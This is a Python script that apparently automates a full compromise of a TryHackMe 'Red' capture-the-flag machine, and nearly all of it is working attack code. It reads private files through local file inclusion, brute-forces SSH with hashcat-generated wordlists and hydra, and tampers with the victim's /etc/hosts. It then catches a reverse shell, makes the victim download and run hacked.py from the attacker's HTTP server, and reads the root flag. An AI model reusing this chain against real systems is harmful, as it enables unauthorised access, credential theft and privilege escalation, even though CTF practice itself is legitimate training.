import os
import paramiko
import requests
import socket
import subprocess
import sys
import time
import threading
import re

RULES_FILE = "/usr/share/hashcat/rules/best64.rule"  # Change this if yours is different, found in .bash_history from LFI
USERNAME = "blue"  # Known from the prompt


def read_password_from_file(filename):
    with open(filename, 'r') as file:
        password = file.read().strip()
    return password


def appendFlag(flag):
    with open('flags.txt', 'a') as file:
        file.write(flag + '\n')


def open_ssh_session(ip_address, username, password, attackIP):
    try:
        print(f"attackIP: '{attackIP}', username: '{username}', password: '{password}'")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip_address, port=22, username=username, password=password)

        # print("SSH session opened successfully.")

        # Read contents of the flag1 file
        _, stdout, _ = client.exec_command("cat flag1")
        flag1_contents = stdout.read().decode().strip()
        # print("flag1 contents: " + flag1_contents)

        # Save contents to flags.txt locally
        appendFlag(flag1_contents)

        command = "/usr/bin/echo '" + attackIP + " redrules.thm' | tee -a /etc/hosts"
        stdin, stdout, stderr = client.exec_command(command)

        # Read and print the output of the command
        command_output = stdout.read().decode()
        # print(command_output)

        # Print the contents of /etc/hosts
        _, stdout, _ = client.exec_command("cat /etc/hosts")
        hosts_file_contents = stdout.read().decode()
        print("Contents of /etc/hosts:")
        print(hosts_file_contents)

        # client.exec_command("cd /tmp")

        client.close()
    # print("SSH session closed.")
    except paramiko.AuthenticationException:
        print("Authentication failed. Check your credentials.")
    except paramiko.SSHException as e:
        print(f"SSH error: {e}")


def fetch_url(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return None


def save_to_file(filename, content):
    with open(filename, 'w') as file:
        file.write(content)


def local_file_inclusion(ip_address):
    bash_history_url = f"http://{ip_address}/index.php?page=php://filter/resource=/home/blue/.bash_history"
    bash_history_content = fetch_url(bash_history_url)

    reminder_url = f"http://{ip_address}/index.php?page=php://filter/resource=/home/blue/.reminder"
    reminder_content = fetch_url(reminder_url)

    if bash_history_content is not None:
        save_to_file("bash_history.txt", bash_history_content)
        print("Bash history saved to bash_history.txt")
    else:
        print("Failed to fetch bash history content")

    if reminder_content is not None:
        save_to_file("reminder.txt", reminder_content)
        print("Reminder content saved to reminder.txt")
    else:
        print("Failed to fetch reminder content")


def hashcat():
    input_file = "reminder.txt"
    output_file = "passlist.txt"

    # Construct the command
    command = f"hashcat --stdout {input_file} -r {RULES_FILE} > {output_file}"

    # Run the command using subprocess
    try:
        subprocess.run(command, shell=True, check=True)
        print("Passlist generated successfully!")
    except subprocess.CalledProcessError as e:
        print(f"An error using hashcat occurred: {e}")


def hydra(ip_address):
    command = "hydra -l " + USERNAME + " -P passlist.txt " + ip_address + " ssh -t4 -I > hydra.txt"
    print("Hydra is starting...")
    try:
        subprocess.run(command, shell=True, check=True)
        print("Successfully found password")
        with open("hydra.txt", "r") as file:
            file_contents = file.read()

        # read file for the keyword and split into a before and after, [1] denotes after, .strip() to remove spaces
        password = [line.split("password:", 1)[1].strip() for line in file_contents.splitlines() if
                     "password:" in line]

        print(password)

        with open("bluePass.txt", "w") as output_file:
            output_file.write('\n'.join(password))

        os.remove("hydra.txt")
    except subprocess.CalledProcessError as e:
        print(f"An error finding password occurred: {e}")


def sendRecv(victim, command):
    response = ''
    victim.sendall(command.encode())
    time.sleep(1)
    response += victim.recv(69549).decode()

    return response


def setExploit(attackIP):
    try:
        command = f'python3 -m http.server 9000 --bind {attackIP}'
        os.system(command)
    except Exception as e:
        print(f'An error occurred: {e}')


def socketServer(attackIP):
    redPort = 9001
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("", redPort))
    print("[*] Waiting for Connection... Can take up to 15 minutes...")
    server_socket.listen()

    victim, addr = server_socket.accept()
    print(f"Connection from: {addr}")
    time.sleep(2)
    response = sendRecv(victim, "cat flag2\n")
    flag2 = re.findall(r'THM\{[^\}]+\}', response)
    print("flag2 contents: " + flag2)
    appendFlag(flag2)
    time.sleep(2)

    # set up and serve exploit
    t = threading.Thread(target=setExploit, args=(attackIP,))  # the comma makes it a tuple...
    t.daemon = True
    t.start()
    time.sleep(2)

    # get file > execute > get root flag
    print("attacking victim...")
    victim.sendall("cd /tmp\n".encode())
    time.sleep(3)
    victim.sendall("rm exploit\n".encode())
    time.sleep(3)
    sendRecv(victim, f"wget http://{attackIP}:9000/hacked.py\n")
    time.sleep(2)
    response = sendRecv(victim, "python3 hacked.py\n")
    print(response)
    time.sleep(10)
    victim.sendall("cd /root\n".encode())
    time.sleep(1)
    response = sendRecv(victim, "cat flag3\n")
    flag3 = re.findall(r'THM\{[^\}]+\}', response)
    print(flag3)
    appendFlag(flag3)

    print("Successfully grabbed all flags!")
    print("Find them in your flags.txt file!")
    # print("program exiting...")


def main(ip_address, attackIP):
    # Pulling the LFI information from the site
    local_file_inclusion(ip_address)

    # Create the hashcat file from .reminder
    hashcat()

    # hydra bruteforce using passlist.txt saving as bluePass.txt
    hydra(ip_address)

    # SSH into machine and set up the /etc/hosts file
    password = read_password_from_file("bluePass.txt")
    open_ssh_session(ip_address, USERNAME, password, attackIP)

    # Create listener > get Red Flag > set and serve up exploit > get file > execute > take root flag
    socketServer(attackIP)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 thmRedAutopwn.py <Victim IP> <Attack IP>")
    else:
        file_names = ['hacked.py']
        current_directory = os.getcwd()
        # Check if all files are present in the current directory
        all_files_exist = all(os.path.exists(os.path.join(current_directory, file_name)) for file_name in file_names)
        if all_files_exist:
            ip_address = sys.argv[1]
            attackIP = sys.argv[2]
            main(ip_address, attackIP)
        else:
            print("Please make sure you have the hacked.py file in the current folder")

